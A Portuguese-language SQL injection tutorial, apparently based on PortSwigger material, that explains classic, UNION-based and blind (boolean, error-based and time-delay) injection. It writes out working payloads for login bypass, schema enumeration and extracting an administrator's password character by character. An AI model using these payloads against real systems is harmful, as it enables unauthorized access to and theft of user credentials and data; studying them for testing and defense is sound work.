# SQL Injection 

Sql injection é uma vulnerabilidade que permite que um atacante interfira nas queries que a aplicação faz para o banco. Isso geralmente permite que o atacante veja dados que não deveria ser capaz de buscar, isso pode incluir dados pertencentes a outros usuários ou qualquer outro dado que a aplicação possa acessar.

Existem casos que o atacante consegue atualizar ou deletar dados, causando comportamentos persistentes na aplicação.

Um exemplo seria a seguinte URL: `https://aplicacao.com/products?category=Gifts`

A query gerada seria algo similar a isso:

```sql
SELECT * FROM products 
WHERE category = 'Gifts' 
AND released = 1
```

Caso o atacante mude a URL para ficar dessa maneira: `https://aplicacao.com/products?category=Gifts'--`

A query seria montada dessa maneira:

```sql
SELECT * FROM products 
WHERE category = 'Gifts' --' AND released = 1
```

Comentando a parte onde efetua a verificação se o produto foi lançado ou não, e assim trazendo dados que não deveriam ser visualizados da categoria `Gifts`.

Porém se esse ataque puder ser efetuado, então podemos trazer todos os dados de todas as categorias da tabela selecionada da seguinte maneira:

`https://aplicacao.com/products?category=Gifts'+OR+1=1--`

Quando a query for montada será assim:

```sql
SELECT * FROM products 
WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

No caso, ou a categoria é `Gifts` ou `1=1`, como conhecemos lógica proposicional sabemos que o resultado será verdadeiro, assim trazendo todos os dados da tabela.

___

### Formulário de login

Imagine um formulário de login, onde pede `username` e `password`, levando em consideração que nos `inputs` foram passados `Renan` como login e `paçocadoce` como password a query seria montada da seguinte maneira:

```sql
SELECT * FROM users WHERE
username = 'Renan' 
AND password = 'paçocadoce'
```

Caso o usuário exista, ele irá criar a sessão através dos dados de detalhe do usuário, caso contrário o login será rejeitado.

Como poderíamos modificar a query de um formulário que envia payloads (HTTP POST)?

Então, podemos simplesmente no campo de login informar o seguinte usuário `admin--`. Dessa forma a query irá ter o seguinte comportamento:

```sql
SELECT * FROM users WHERE
username = 'admin'-- AND password = 'paçocadoce'
```

A parte da senha será comentada, e caso o usuário admin exista, ele irá retornar os detalhes do mesmo.

Mas e se for uma tabela de fotografias? Não é tão relevante, o que poderíamos fazer?

### Union SQL Injection

Podemos utilizar [Union](https://www.w3schools.com/sql/sql_union.asp) para combinar o resultado de dois `selects`

Levando em consideração o primeiro exemplo da tabela `products`, onde a URL é a seguinte: `https://aplicacao.com/products?category=Gifts` e a query:

```sql
SELECT * FROM products 
WHERE category = 'Gifts' 
AND released = 1
```

Podemos trocar a URL e injetar nosso SQL no parâmetro category (GET): `https://aplicacao.com/products?category=Gifts' UNION SELECT username, password from users--`

A nova query será montada assim: 

```sql
SELECT * FROM products 
WHERE category = 'Gifts' 
UNION SELECT username, password 
from users-- AND released = 1
```

Então junto com a descrição dos produtos, caso a tabela `users` exista e tenha as colunas `username` e `password` os dados selecionados dessa tabela serão mesclados com os detalhes dos produtos da tabela `products`.

#### Determinando as colunas em um ataque de UNION SQLI

Existem dois métodos para determinar quantas colunas estão sendo retornadas da query original, a primeira é testando com `ORDER BY` e incrementando o índice até algum erro acontecer, um exemplo seria:

`https://aplicacao.com/products?category=Gifts' ORDER BY 1--`

`https://aplicacao.com/products?category=Gifts' ORDER BY 2--`

`https://aplicacao.com/products?category=Gifts' ORDER BY 3--`

Incrementando até ocorrer o erro. O `ORDER BY`é utilizada por seu índice, então não existe necessidade de saber o nome da coluna. Quando esse índice ultrapassa o número de colunas, o banco irá retornar um erro simular a esse:

`The ORDER BY position number 3 is out of range of the number of items in the select list.`

Lembrando que aplicação poderá tratar a exceção e mostrar um erro genérico e não especificamente o erro do banco. Mas qualquer diferença do resultado esperado na resposta HTTP já conseguimos saber se existe aquele número de colunas ou não.

Existe outra maneira, que é especificar um número de valores nulos utilizando `UNION SELECT`, ficaria da seguinte maneira:

`https://aplicacao.com/products?category=Gifts' UNION SELECT NULL, NULL, NULL--`

E caso o número de nulos não bata com o número de colunas o banco irá gerar uma exceção similar a essa:

`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

Que também poderá ser tratada pela aplicação gerando um erro genérico. Caso a resposta HTTP seja indistinguível da com erro, o método de contagem de colunas se torna inefetivo.

Mas por que utilizar nulo? Pelo fato de que o tipo de cada coluna precisa ser compatível entre o original e as queries injetadas, sendo assim o NULL é conversível para a grande maioria dos tipos utilizados, então utilizar NULL maximiza a chance do payload funcionar.

Em DB's Oracle todo `SELECT` precisa utilizar `FROM` e especificar uma tabela válida, sendo assim existe uma tabela chamada [`dual`](https://docs.oracle.com/cd/B19306_01/server.102/b14200/queries009.htm) que pode ser utilizada, então as queries injetadas em bancos Oracle precisam parecer com isso:

`' UNION SELECT NULL FROM DUAL--`

Lembrando que no MYSQL após o double-dash que é utilizado para comentar o restante da Query orginal, é necessário ter um espaço ou então utilizar `#`para identificar o comentário.

#### Encontrando colunas com data types úteis com um union attack

Normalmente efetuamos `union attack`para conseguir resultados de uma query injetada, os dados que retornarão serão em forma de string, então é necessário encontrar uma ou mais colunas na query original que o data type é compatível com string.

No caso de já ter determinado o número de colunas, você pode testar cada coluna para verificar se ela possui um tipo compatível com string, podemos fazer isso enviando uma série de payloads `UNION SELECT` que colocam uma string em cada coluna. Supondo que a query retorne 4 colunas, poderíamos enviar os seguintes payloads:

`' UNION SELECT 'a',NULL,NULL,NULL--`

`' UNION SELECT NULL,'a',NULL,NULL--`

`' UNION SELECT NULL,NULL,'a',NULL--`

`' UNION SELECT NULL,NULL,NULL,'a'--`

Caso a coluna não seja compatível com o data type string, a query injetada irá causar um erro de banco similar a esse:

`Conversion failed when converting the varchar value 'a' to data type int.`

Caso o erro não ocorra e a aplicação tenha algum conteúdo adicional na resposta da string injetada, então a coluna é compatível com o data type testado.

#### Utilizando UNION attack para buscar dados interessantes.

Quando você consegue identificar o tanto de colunas retornado pela query original e quais delas suportam o data type string, então você já pode buscar dados mais interessantes...

Vamos supor que:

 * A query original retorne duas colunas e ambas sejam compatíveis com o data type string;
  
 * O ponto de injeção é uma string comum de aspas da clausula WHERE;
 * No banco de dados existe uma tabela chamada `users` com as colunas `username` e `password`;

Para trazer o conteúdo da tabela e as colunas citadas, bata você injetar da seguinte maneira:

`' UNION SELECT username, password from users--`

A informação necessária para efetuar o ataque é que existe uma tabela `users` com as duas colunas `username` e `password`, sem isso você teria que tentar adivinhar o nome das tabelas e colunas. MAAAAAAAAAAAS, todos os bancos modernos tem uma maneira de examinar a estrutura do banco para saber o nome das tabelas e colunas contidas.

### Analistando o banco com SQL Injection

Quando exploramos SQLI, precisamos buscar algumas informações, as informações incluem o tipo e version do banco e o conteúdo do banco, como colunas e tabelas.

#### Buscando tipo e versão do banco

Vamos supor que tenhamos um banco `MySQL` ou `MSSQL` vulnerável, a maneira de obter essa informação é executando:

```sql
SELECT @@version
```

Sendo assim, em um UNION Attack, podemos utilizar da seguinte maneira:

`' UNION SELECT @@version--`

O retorno seria algo similar a isso:

```Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)```

<b>Lembrando que a query injetada precisa ser executada em um campo compatível com o data type string.</b>

#### Buscando o conteúdo do banco

A maioria dos bancos (com exceção do Oracle) tem um conjunto de views chamado information schema, onde existem informações sobre a base de dados.

Podemos fazer a query para obter as tabelas da seguinte maneira:

```sql
SELECT * FROM information_schema.tables
 ```

O retorno será algo similar a isso:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

O output do select indica que existe 3 tabelas, Products, Users e Feedback.
Ok, temos as tabelas, mas e as colunas?

Podemos buscar as colunas na tabela `information_schema.columns` da seguinte maneira, vamos buscar as colunas da tabela Users:

```sql
SELECT * FROM information_schema.columns WHERE table_name='Users'
```
O retorno seria:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```
No resultado da query temos os nomes das colunas da tabela `Users`.

Mas e o Oracle que não tem `information_schema`?

#### Buscando informações no DB Oracle

A tabela equivalente no oracle é a `all_tables`:

```sql
SELECT * FROM all_tables
```

e para listar as colunas é a `all_tab_columns` da seguinte maneira:

```sql
SELECT * FROM all_tab_columns WHERE table_name = 'Users'
```

#### Trazendo valores quando apenas uma das colunas é compatível com string

Vamos levar em consideração o exemplo anterior, onde a tabela é `Users` e existem as colunas `username` e `password`, podemos utilizar o `concat` se for `MYSQL` da seguinte maneira:

`' UNION SELECT username concat(username, '~', password) FROM Users--`

O resultado seria algo similar a isso:

```
...
administrator~s3cr3tpass
renan~thisisactuallymyrealpassword
jubiscreide~omgwhatwonderfullname
...
```
Para saber como funciona a concatenação em cada banco podemos consultar a documentação ou buscar `cheat sheets` referente a isso, inclusive existe o da [`portswigger`](https://portswigger.net/web-security/sql-injection/cheat-sheet) que é muito bom.

### Vulnerabilidades Blind SQLI

##### O que é Blind SQLI?

Blind SQLI é quando a aplicação é vulnerável a SQLI, porém as respostas HTTP não contém nenhum resultado relevante da Query ou erros do banco.

Com BlindSQLI muitas técnicas como UNION attacks não são efetivas, porque eles são baseadas em respostas das queries injetadas e na resposta da aplicação.
Ainda é possível explorar SQLI para obter dados, mas diferentes técnicas precisam ser utilizadas.

Levando em consideração o banco envolvido  e a vulnerabilidade, podem ser utilizados para explorar Blind SQLI as seguintes formas:

* Mudar a lógica da query para detectar diferenças na resposta da aplicação dependendo da condição ser verdadeira ou não. Isso pode envolver injetar alguma lógica booleana ou gerar um erro de divisão por zero.
* Você pode condicionalmente gerar um delay para processar a query, permitindo saber se é vulnerável ou não de baseado no tempo que a aplicação demora pra responder.
* Você pode gerar uma interação de rede out-of-band, pode utilizar técnicas [OAST](https://portswigger.net/burp/application-security-testing/oast). É uma técnica bem eficaz e pode funcionar onde outras técnicas falharão. Normalmente você poderá filtrar os dados através do canal out-of-band, um exemplo seria colocar os dados de uma busca em um DNS que você controla.

#### Explorando SQLI com respostas condicionais

Considere uma aplicação que utiliza tracking cookies para analisar sobre o uso do mesmo, no caso os requests da aplicação contém um header de Cookie similar a esse:

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

Quando o request é processado o TrackingId é enviado para aplicação para determinar se é um usuário conhecido, a query ficaria assim:

```sql
SELECT TrackingId From TrackedUsers WHERE TrackingID = 'u5YD3PapBcR4lN3e7Tj4'
```

Essa query é vulnerável a SQLI, mas os resultados não são retornados ao usuário, mas a aplicação se comporta de forma diferente dependente do retorno da query.
Caso retorne algo (devido ao TrackingId já existir), então uma mensagem: "Welcome back" é mostrada para o usuário.

Esse comportamento é suficiente para podermos explorar o blind SQLI e buscar informações. Pra ver o funcionamento, vamos supor que dois requests foram enviados com o seguinte TrackingId:

```sql
...xyz' AND '1'='1
...xyz' AND '1'='2
```

O primeiro irá retornar resultado, porque o `AND '1'='1` é verdadeiro caso exista o TrackingId na base, e então a mensagem `Welcome Back`é mostrada na página. Porém o segundo valor nunca será verdadeiro, então a mensagem nunca será mostrada, o que nos permite definir a resposta pra cada condição injetada e extrair os dados de forma parcial.

Voltando ao exemplo da tabela `Users` com as colunas `username` e `password` e o usuário chamado `Administrator`. Podemos descobrir a senha desse usuário mandando uma série de inputs para testar cada letra da senha por vez.

Exemplo: 

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

Se retornar a mensagem "Welcome back", quer dizer que o código injetado é verdadeiro, ou seja, a primeira letra da senha é "maior" que `m`.


Então mandamos a seguinte query:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

E essa query não retorna a mensagem de `Welcome Back`, indicando que a condição injetada é falsa, então vimos que a primeira letra do password não é maior que t.

Tentando entre esses dois chegaremos a primeira letra, o que retornará a mensagem `Welcome Back` confirmado nossa query injetada.

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

#### Induzindo respostas condicionais através de erros SQL

Supondo que que a aplicação anterior tenha a mesma query, mas não se comporte diferente independente da query retornar dados ou não, então o ataque não irá funcionar, porque injetar condições booleanas não fará diferença na resposta da aplicação.

Nesse caso, geralmente ainda é possível efetuar erros baseados em queries condicionais, isso envolve modificar a query fazendo com que ela cause um erro se a condição for verdadeira, caso contrário continue normalmente. Na maioria das vezes erros não tratados e lançados pelo banco irão causar alguma diferença na resposta da aplicação, seja ela um campo diferente ou uma mensagem de erro, e isso nos permite saber o comportamento da condição injetada.

Vamos supor que dois requests são enviados contendo o `TrackingId` da seguinte maneira:

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```

```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Esses `selects` utilizam `CASE` para efetuar a condicional e retornar expressões diferentes dependendo de qual delas é verdadeira. No primeiro input, o `CASE` resulta em `'a'`, que não causa erro algum. Já o segundo input resulta em 1/0, que causa um erro de divisão por zero. Levando em conta que o erro cause alguma diferença na resposta da aplicação, nos podemos utilizar a diferença para testar o resultado da nossa injeção.

Vamos ver como ficaria uma query para testar a primeira letra do usuário `Administrator` dessa maneira:

```sql
xyz' AND (SELECT CASE WHEN (Username = 'ADMINISTRATOR AND SUBSTRING (Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

#### Explorando Blind SQLI com time delays

Vamos supor que no exemplo anterior a aplicação lide bem com erros, e gerar erros condicionais não irão funcionar, como proceder?

Nessa situação ainda é possível explorar Blind SQLI gerando tempos de resposta condicionais de acordo com condições injetadas. As queries são geralmente processadas de forma síncrona pela aplicação, então gerar delay na query também irá gerar delay na resposta HTTP. O que nos permite saber o resultado da condição injetada através do tempo até a resposta HTTP retornar.

Porém a técnica de gerar delays são especificas do banco que está sendo utilizado, vamos utilizar um exemplo de MSSQL, que irá gerar o delay dependendo da condição passada:

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
```

```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

O primeiro como vemos não vai gerar o delay, já o segundo vai porque a condição 1=1 é verdadeira.

Utilizando essa técnica podemos trazer dados da maneira já descrita nas explorações anterior, só que ao invés de utilizar erros, iremos utilizar o tempo. :)

```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
```

Caso a primeira letra da senha do usuário `Administrator` seja "maior" que m no alfabeto, será gerado um delay de 10 segundos, e podemos efetuar esse mesmo ataque para as outras letras aumentando o substring.

`Ref: PortSwigger`